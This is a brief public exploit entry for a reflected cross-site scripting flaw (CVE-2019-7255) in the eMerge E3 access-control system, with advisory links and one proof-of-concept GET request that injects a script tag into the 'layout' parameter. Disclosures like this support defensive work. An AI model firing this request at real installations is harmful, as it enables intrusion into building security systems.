# Exploit Title: eMerge E3 1.00-06 - 'layout' Reflected Cross-Site Scripting
# Google Dork: NA
# Date: 2018-11-11
# Exploit Author: LiquidWorm
# Vendor Homepage: http://linear-solutions.com/nsc_family/e3-series/
# Software Link: http://linear-solutions.com/nsc_family/e3-series/
# Version: 1.00-06
# Tested on: NA
# CVE : CVE-2019-7255
# Advisory: https://applied-risk.com/resources/ar-2019-009
# Paper: https://applied-risk.com/resources/i-own-your-building-management-system
# Advisory: https://applied-risk.com/resources/ar-2019-005

# PoC:
GET /badging/badge_template_v0.php?layout=<script>confirm('XSS')</script> HTTP/1.1